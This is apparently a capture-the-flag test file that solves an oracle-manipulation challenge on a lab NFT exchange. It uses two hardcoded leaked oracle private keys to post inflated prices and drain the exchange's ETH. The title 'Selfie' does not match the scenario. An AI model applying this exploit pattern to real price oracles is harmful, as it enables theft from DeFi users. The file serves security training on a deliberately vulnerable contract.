const { ether, time } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const { expect } = require('chai');
const balance = require('@openzeppelin/test-helpers/src/balance');

describe("[Challenge] Selfie", function () {
  // Ethereum balances
  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther("10000");
  const INITIAL_NFT_PRICE = ethers.utils.parseEther("999");
  let initialAttackerBalance;
  let overrides;

  const sources = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
  ];

  // Declare variables
  let ContractFactoryA;
  let ContractFactoryB;
  let ContractFactoryC;
  let ContractFactoryD;

  let exchange;
  let token;
  let oracle;
  let TrustfulOracleInitializer;

  let deployer;
  let attacker;
  let user;
  
  before(async function () {
    [deployer, attacker, user] = await ethers.getSigners();
    ContractFactoryA = await ethers.getContractFactory("Exchange");
    ContractFactoryB = await ethers.getContractFactory("DamnValuableNFT");
    ContractFactoryC = await ethers.getContractFactory("TrustfulOracle");
    ContractFactoryD = await ethers.getContractFactory("TrustfulOracleInitializer");
    
    await user.sendTransaction({
      to: deployer.address,
      value: ethers.utils.parseEther("1000")
    });

    // Fund the trusted source addresses
    await deployer.sendTransaction({
      to: sources[0],
      value: ethers.utils.parseEther("5")
    });

    await deployer.sendTransaction({
      to: sources[1],
      value: ethers.utils.parseEther("5")
    });

    await deployer.sendTransaction({
      to: sources[2],
      value: ethers.utils.parseEther("5")
    });
    
    // Deploy the oracle and setup the trusted sources with initial prices

    TrustfulOracleInitializer = await ContractFactoryD.deploy(
      sources,
      ["DVNFT", "DVNFT", "DVNFT"],
      [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
    )

    oracle = await ContractFactoryC.attach(await TrustfulOracleInitializer.oracle());

    // Deploy the exchange and get the associated ERC721 token
    overrides = {
      value: EXCHANGE_INITIAL_ETH_BALANCE
    };

    exchange = await ContractFactoryA.deploy(oracle.address, overrides);
    token = await ContractFactoryB.attach(await exchange.token());
    initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  })

  it("Exploit", async function() {
    // We found the private keys to two of the oracle addresses
    const privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    const privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

    // Connect the private keys to the network as a wallet instance
    let oracle_wallet_1 = new ethers.Wallet(privateKey1, deployer.provider);
    let oracle_wallet_2 = new ethers.Wallet(privateKey2, deployer.provider);
    
    // Buy first NFT for 999 ETH
    await exchange.connect(attacker).buyOne({value: INITIAL_NFT_PRICE});
    
    // Manipulate oracle prices => 10999 and 20000 => median price = 10999 (INITIAL EXCHANGE BALANCE + INITIAL NFT PRICE)
    const MANIPULATED_NFT_PRICE = ethers.utils.parseEther("10999");
    const MANIPULATED_NFT_PRICE_2 = ethers.utils.parseEther("20000");
    await oracle.connect(oracle_wallet_1).postPrice("DVNFT", MANIPULATED_NFT_PRICE);
    await oracle.connect(oracle_wallet_2).postPrice("DVNFT", MANIPULATED_NFT_PRICE_2);

    // Approve exchange to transfer attacker's recently purchased NFT
    await token.connect(attacker).approve(exchange.address, 1);

    // Sell attacker's NFT for 10999 ETH
    await exchange.connect(attacker).sellOne(1);
  })

  after(async function () {
    expect(await ethers.provider.getBalance(exchange.address)).to.equal(0);
  })
})
